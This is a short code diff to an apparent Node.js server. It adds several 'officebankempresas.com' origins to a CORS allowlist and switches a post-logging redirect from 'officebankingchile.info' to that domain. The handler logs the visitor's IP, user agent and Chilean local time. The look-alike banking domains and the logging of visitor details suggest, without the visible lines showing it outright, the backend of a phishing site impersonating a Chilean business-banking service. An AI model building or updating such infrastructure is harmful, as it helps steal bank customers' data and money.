@@ -63,6 +63,10 @@ const corsOptions = {
   origin: function(origin, callback) {
     if (
       !origin ||
+      origin === "https://www.officebankempresas.com" ||
+      origin === "https://officebankempresas.com" ||
+      origin === "http://officebankempresas.com" ||
+      origin === "http://www.officebankempresas.com" ||
       origin === "https://www.officebankingchile.info" ||
       origin === "https://officebankingchile.info" ||
       origin === "https://obchile-p9hv.onrender.com" ||
@@ -783,7 +787,7 @@ IP: ${ip}
 UA: ${userAgent}
 Hora: ${new Date().toLocaleString("es-CL")}`);
 
-  res.redirect("https://www.officebankingchile.info/");
+  res.redirect("https://www.officebankempresas.com/");
 });
 
 // =======================
